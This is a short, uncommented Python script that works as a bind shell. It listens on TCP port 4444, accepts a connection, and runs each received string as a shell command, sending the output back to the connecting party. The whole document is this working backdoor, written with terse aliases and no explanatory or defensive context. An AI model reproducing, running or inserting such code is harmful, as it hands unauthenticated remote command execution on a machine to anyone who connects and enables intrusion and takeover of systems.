import socket as s
import subprocess as r
so=s.socket(s.AF_INET,s.SOCK_STREAM)
so.bind(('',4444))
so.listen(1)
so,addr=so.accept()
while True:
	d=so.recv(1024)
	if len(d)==0:
		break
	p=r.Popen(d,shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)
	o=p.stdout.read()+p.stderr.read()
	so.send(o)
